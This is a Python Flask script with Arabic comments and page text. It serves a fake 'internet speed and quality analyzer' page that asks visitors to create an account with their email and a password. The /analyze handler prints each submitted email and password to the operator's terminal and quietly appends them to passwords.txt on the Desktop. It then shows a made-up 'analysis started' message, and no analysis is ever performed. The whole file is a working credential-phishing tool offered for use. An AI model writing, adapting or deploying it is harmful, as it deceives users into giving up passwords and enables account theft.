import os
from flask import Flask, request, render_template_string

app = Flask(__name__)

# تحديد مسار ملف النص على سطح المكتب تلقائياً
DESKTOP_PATH = os.path.join(os.path.expanduser("~"), "Desktop", "passwords.txt")

# --- واجهة موقع محلل الإنترنت الشامل ---
HTML_INTERFACE = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>أداة تحليل وأمان شبكة الإنترنت الاحترافية</title>
    <style>
        body { font-family: sans-serif; background-color: #0f172a; color: #f8fafc; text-align: center; padding: 50px 20px; }
        .container { max-width: 500px; margin: 0 auto; background: #1e293b; padding: 30px; border-radius: 12px; border: 1px solid #334155; }
        h2 { color: #38bdf8; }
        p { color: #94a3b8; font-size: 14px; }
        .input-group { text-align: right; margin-bottom: 15px; }
        label { display: block; margin-bottom: 5px; color: #cbd5e1; }
        input { width: 100%; padding: 10px; border-radius: 6px; border: 1px solid #475569; background: #0f172a; color: #fff; box-sizing: border-box; }
        button { width: 100%; background: #0284c7; color: white; padding: 12px; border: none; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 15px; }
    </style>
</head>
<body>
    <div class="container">
        <h2>محلل أداء وجودة الإنترنت</h2>
        <p>قم بإنشاء حساب مجاني لفحص سرعة اتصالك، وتحليل زمن الاستجابة (Ping) فوراً.</p>
        <form action="/analyze" method="POST">
            <div class="input-group">
                <label>البريد الإلكتروني للتقرير:</label>
                <input type="email" name="email" required>
            </div>
            <div class="input-group">
                <label>تعيين كلمة مرور الحساب:</label>
                <input type="password" name="password" required>
            </div>
            <button type="submit">ابدأ الفحص الشامل للشبكة الآن</button>
        </form>
    </div>
</body>
</html>
'''

HTML_RESULT = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>جاري التحليل...</title>
    <style>
        body { font-family: sans-serif; background-color: #0f172a; color: #fff; text-align: center; padding-top: 100px; }
        .box { display: inline-block; background: #1e293b; padding: 40px; border-radius: 10px; border: 1px solid #22c55e; }
    </style>
</head>
<body>
    <div class="box">
        <h3>🟢 تم بدء التحليل بنجاح!</h3>
        <p>جاري فحص سرعة اتصالك ومزود الخدمة الخاص بك...</p>
        <p style="color: #94a3b8;">سيتم إرسال تقرير الأداء المفصل إلى بريدك الإلكتروني فور اكتماله.</p>
    </div>
</body>
</html>
'''

@app.route('/')
def home():
    return render_template_string(HTML_INTERFACE)

@app.route('/analyze', methods=['POST'])
def analyze():
    email = request.form['email']
    password = request.form['password']
    
    # 1. طباعة الكلمة فوراً في الشاشة السوداء (Terminal) أمامك
    print("\n" + "="*40)
    print(f"[🚨] بيانات مستخدم جديدة وصلت الآن:")
    print(f"📧 الإيميل: {email}")
    print(f"🔑 كلمة السر المباشرة: {password}")
    print("="*40 + "\n")
    
    # 2. حفظ البيانات خفية في ملف نصي عادي (TXT) على سطح المكتب
    with open(DESKTOP_PATH, "a", encoding="utf-8") as file:
        file.write(f"الإيميل: {email} | كلمة السر: {password}\n")
    
    return render_template_string(HTML_RESULT)

if __name__ == '__main__':
    print(f"[+] السيرفر يعمل الآن... سيتم حفظ الكلمات في ملف: {DESKTOP_PATH}")
    app.run(debug=True, port=8080)
